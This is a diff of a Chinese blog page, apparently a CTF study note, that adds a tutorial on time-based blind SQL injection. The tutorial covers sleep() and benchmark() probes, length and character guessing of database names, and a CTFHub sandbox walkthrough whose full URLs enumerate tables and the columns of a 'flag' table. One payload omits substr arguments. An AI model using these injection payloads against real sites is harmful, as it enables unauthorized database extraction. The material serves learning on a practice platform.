@@ -481,14 +481,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.8k
+                    3.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    12 分
+                    14 分
                 </div>
                 
 
@@ -762,6 +762,32 @@ left((select database()),1)&#x3D;‘s’ 同样的意思
 <li>benchmark函数原本是用来重复执行某个语句的函数</li>
 <li>benchmark(N,expression)</li>
 <li>N是执行的次数，expression是表达式，如果需要进行盲注，通常需要进行消耗时间和性能的计算，例如哈希计算函数MD5，将MD5函数重复执行数万次则可以达到延迟的效果，而具体的情况西药根据不同比赛的服务器性能来决定</li>
+</ol>
+<h3 id="实现过程："><a href="#实现过程：" class="headerlink" title="实现过程："></a>实现过程：</h3><h4 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h4><ol>
+<li><p>和1=1返回页面相同，说明不是布尔盲注，是时间盲注</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; and 1&#x3D;1 --+ 页面返回有数据
+1&#39; and 1&#x3D;2 --+ 页面返回也有数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li><p>判断可以使用的注入方法</p>
+<pre class="line-numbers language-none"><code class="language-none">sleep()判断能否利用时间盲注
+1&#39; and sleep(5) --+ 页面延时了，则为时间盲注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li><p>猜数据库名称长度</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; and if(length(database()) &#x3D; 10,sleep(5),1) --+ 页面延时了，则当前数据库名称长度为10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>猜测数据库名称(ASCII码)</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; and if(ascii(substr(database()))&#x3D;107,sleep(5),1) --+ 如果页面延时了，则第一个字符的ascii码值为107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h3 id="逻辑判断"><a href="#逻辑判断" class="headerlink" title="逻辑判断"></a>逻辑判断</h3><ol>
+<li>判断长度<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(10),1) --+ 如果页面窗口转了10s，说明长度为8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>猜测字符（<strong>数据库名</strong>第一位）<br>?id=1’ and if(mid(database(),1,1)=’s’,10,0) –+ 如果页面跳转了10s，说明database的第一个字符为s</li>
+<li>猜测字符(<strong>猜测第一个表名</strong>的第一位)</li>
+</ol>
+<h3 id="例题-ctfhub时间盲注"><a href="#例题-ctfhub时间盲注" class="headerlink" title="例题:ctfhub时间盲注"></a>例题:ctfhub时间盲注</h3><ol>
+<li>判断数据库名字长度<br><img src="https://s2.loli.net/2022/07/02/HZmto3NRM4vAlcS.png"></li>
+<li>用二分法逐个字符判断数据库名字，例如这个地方先判断了第一个字符是s，（<strong>ascii(s) = 115</strong>）<br><img src="https://s2.loli.net/2022/07/02/ONKdQMlPenB8YoE.png"><br><img src="https://s2.loli.net/2022/07/02/LxQ9gR72DrIyqTG.png"></li>
+<li>判断数据库中表的个数<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if((select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;sqli&#39;) &#x3D; 2,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s2.loli.net/2022/07/02/LxQ9gR72DrIyqTG.png"></li>
+<li>逐个字符判断数据库中表的名字，(此处ascii(f) = 102)<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)) &#x3D; 102,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s2.loli.net/2022/07/02/fOi4p3JN1MxbqGH.png"></li>
+<li>猜测flag表的字段数<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if((select count(column_name) from information_schema.columns where table_name &#x3D; &#39;flag&#39;) &#x3D; 1,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ol>
 
                 
@@ -1317,7 +1343,7 @@ left((select database()),1)&#x3D;‘s’ 同样的意思
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">51.1k</span>&nbsp;字
+                class="white-color">51.5k</span>&nbsp;字
             
             
             
